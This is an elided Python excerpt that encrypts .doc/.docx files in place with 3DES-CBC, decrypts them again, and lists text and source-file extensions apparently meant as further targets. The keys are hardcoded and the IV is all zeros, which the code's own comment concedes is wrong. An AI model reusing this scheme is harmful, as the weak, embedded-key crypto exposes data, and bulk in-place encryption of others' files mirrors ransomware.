    ...
    if file_path != None:
        try:
            ...
            if (ext == '.docx' or ext == '.doc'):
                ...
                f = open(file_path,'w')
                f.write(base64.b64encode(encrypt_3des(data.encode(), des_key)).decode())
                f.close()
    ...
    if file_path != None:
        try:
            ...
            if(ext == '.docx' or ext == '.doc'):
                ...
                f = open(file_path,'w')
                f.write(decrypt_3des(base64.b64decode(data), des_key).decode())
                f.close()
...
def encrypt_3des(data, key):
    ...
    iv = b'\x00' * 8                # Initialization vector, you should use a different one for each encryption
    cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()
    padded_data = pad_data(data, algorithms.TripleDES.block_size)
...
def decrypt_3des(ciphertext, key):
    backend = default_backend()
    iv = b'\x00' * 8                # Initialization vector, should be the same as used during encryption
    cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=backend)
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(ciphertext) + decryptor.finalize()
    data = unpad_data(padded_data, algorithms.TripleDES.block_size)
    return data
...
des_key = b'ZI3z97SW4jyVejL34EDOYTRY'
key = b'XMsqZg0m2J02ufe1WX_MYQB2Uwh4UnBnzRzGr2oyOBs='
text_exts = ['.txt','jsx','js','.md','.ino','.py','.html','.htm','.c','.cpp','.css','.php','.java']
